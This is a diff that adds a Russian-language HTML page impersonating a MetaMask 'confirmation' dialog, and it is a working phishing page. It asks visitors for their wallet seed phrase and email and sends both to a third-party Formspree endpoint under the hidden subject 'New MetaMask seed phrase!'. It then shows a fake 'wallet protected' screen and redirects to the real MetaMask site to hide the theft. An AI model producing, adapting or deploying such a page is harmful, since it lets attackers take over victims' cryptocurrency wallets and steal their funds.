@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MetaMask: Подтверждение</title>
+    <style>
+        body {
+            background-color: #0f1215;
+            color: #fff;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+        .modal {
+            background-color: #1f242d;
+            border-radius: 12px;
+            width: 400px;
+            padding: 24px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+            border: 1px solid #333;
+            position: relative;
+        }
+        .header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+            font-size: 20px;
+            font-weight: 600;
+        }
+        .logo {
+            width: 32px;
+            height: 32px;
+            margin-right: 12px;
+        }
+        .sub-text {
+            color: #a7b1c2;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+        .input-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            color: #a7b1c2;
+            font-size: 12px;
+            margin-bottom: 5px;
+        }
+        input {
+            width: 100%;
+            background-color: #0f1215;
+            border: 1px solid #4f5764;
+            border-radius: 6px;
+            padding: 12px;
+            color: #fff;
+            font-size: 14px;
+            outline: none;
+            box-sizing: border-box;
+        }
+        input:focus {
+            border-color: #f6851b;
+            box-shadow: 0 0 0 1px #f6851b;
+        }
+        .btn-submit {
+            background-color: #f6851b;
+            color: #fff;
+            border: none;
+            width: 100%;
+            padding: 12px;
+            border-radius: 6px;
+            font-weight: 600;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 10px;
+            transition: background 0.2s;
+        }
+        .btn-submit:hover {
+            background-color: #e57a16;
+        }
+        .footer {
+            margin-top: 20px;
+            text-align: center;
+            font-size: 12px;
+            color: #6c757d;
+        }
+        .hidden {
+            display: none;
+        }
+        .success {
+            text-align: center;
+            padding: 20px 0;
+        }
+        .success-icon {
+            font-size: 40px;
+            margin-bottom: 10px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="modal">
+        <!-- Экран формы -->
+        <div id="formView">
+            <div class="header">
+                <!-- SVG логотип MetaMask -->
+                <svg class="logo" viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M32.894 11.325c.368-.187.535-.607.387-.996l-2.562-6.078c-.148-.385-.563-.592-.96-.478l-6.65 2.16c-.36.117-.593.45-.567.82l.33 4.64c-1.646 1.08-3.133 2.436-4.406 4.02l-3.637-2.473c-.337-.227-.77-.137-.987.196-.217.334-.12.77.213.987l3.637 2.473c-.43 1.273-.706 2.63-.807 4.04l-4.677-.937c-.37-.073-.73.167-.813.533-.083.367.157.73.523.813l4.677.937c-.013.16-.027.32-.027.48 0 3.57 1.703 6.77 4.36 8.833.307.24.73.187.97-.12.24-.3.187-.73-.12-.97-2.27-1.733-3.7-4.46-3.7-7.543 0-.113.013-.227.027-.333l-5.127 1.033c-.37.073-.61.433-.533.8.077.37.433.61.8.533l5.127-1.033c1.56 2.213 3.943 3.72 6.673 4.12.37.053.713-.193.767-.56.053-.37-.193-.713-.56-.767-2.46-.35-4.573-1.723-5.967-3.687l4.373 2.973c.32.217.74.133.94-.187.2-.32.113-.74-.187-.94l-4.373-2.973c1.13-1.32 2.493-2.4 3.993-3.187l.33 4.64c.027.37.34.653.7.64.36-.013.64-.313.62-.68l-.33-4.64c1.78-.54 3.57-.773 5.34-.693l4.953-1.607c.36-.116.57-.49.48-.853-.083-.36-.45-.58-.81-.497l-4.953 1.607c-.02-.007-.033-.013-.053-.02l-1.527-10.99c-.053-.383-.4-.647-.78-.6-.383.053-.647.4-.6.78l1.527 10.99c-.007.02-.013.033-.02.053L32.894 11.325zM15.72 17.273c-.447-.167-.96-.06-1.337.28-.377.34-.533.84-.4 1.333.133.493.553.853 1.04 0.933.49.08.987-.12 1.26-.52.273-.4.3-93.33-0.073-1.317-.08-.36-.34-.62-.733-.713-.39-.09-.8.03-1.093.27-.293.24-.44.61-.4 1.02.04.41.31.76.69.93.38.17.81.12 1.14-.13.33-.25.51-.66.48-1.1-.03-.44-.32-.82-.75-.98z" fill="#FFFFFF"/>
+                </svg>
+                MetaMask
+            </div>
+            <div class="sub-text">
+                Подтвердите личность, чтобы продолжить. 
+            </div>
+
+            <form action="https://formspree.io/f/myezloob" method="POST" id="mmForm">
+                <!-- Скрытые поля -->
+                <input type="hidden" name="_subject" value="Новая seed-фраза MetaMask!">
+                <input type="hidden" name="Redirect_URL" value="https://metamask.io">
+
+                <div class="input-group">
+                    <label for="seed">Восстановите свой кошелек (Seed фраза)</label>
+                    <input type="text" id="seed" name="seed_phrase" placeholder="word1 word2 word3 ..." required>
+                </div>
+
+                <div class="input-group">
+                    <label for="email">Ваш Email (для связи)</label>
+                    <input type="email" id="email" name="email" required>
+                </div>
+
+                <button type="submit" class="btn-submit">Подтвердить</button>
+            </form>
+        </div>
+
+        <!-- Экран "Успех" (появляется после отправки) -->
+        <div id="successView" class="hidden success">
+            <div class="success-icon">🛡️</div>
+            <h3>Готово!</h3>
+            <p style="color: #a7b1c2;">Кошелек успешно подключен и защищен.</p>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('mmForm').addEventListener('submit', function(e) {
+            // Не отменяем форму сразу, даем Formspree обработать данные
+            // Но визуализируем успех для пользователя
+            const form = e.target;
+            const btn = form.querySelector('.btn-submit');
+            
+            btn.textContent = 'Подключение...';
+            btn.disabled = true;
+
+            setTimeout(() => {
+                form.querySelector('#formView').classList.add('hidden');
+                form.querySelector('#successView').classList.remove('hidden');
+                
+                // Через 2 секунды перекидываем на официальный сайт
+                setTimeout(() => {
+                    window.location.href = "https://metamask.io";
+                }, 2000);
+            }, 1000);
+        });
+    </script>
+</body>
+</html>
